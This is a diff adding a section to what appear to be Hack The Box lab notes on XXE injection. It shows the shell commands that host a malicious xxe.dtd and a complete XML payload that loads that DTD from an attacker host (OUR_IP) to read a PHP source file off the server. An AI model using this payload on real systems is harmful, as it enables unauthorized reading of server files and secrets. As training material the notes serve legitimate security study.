@@ -60,4 +60,23 @@ We can use CDATA to enclose filecontent, so that it would be considered raw data
   <!ENTITY joined "&begin;&file;&end;">
 ]>
 ```
-This alone would not work as XML does not allow 
+This alone would not work as XML does not allow joining external and internal entity, therefore, we need to write the following line:
+`<!ENTITY joined "&begin;&file;&end;">`
+In to an external file controlled by us, have our payload structured in this way:
+```
+Avalon112@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+Avalon112@htb[/htb]$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
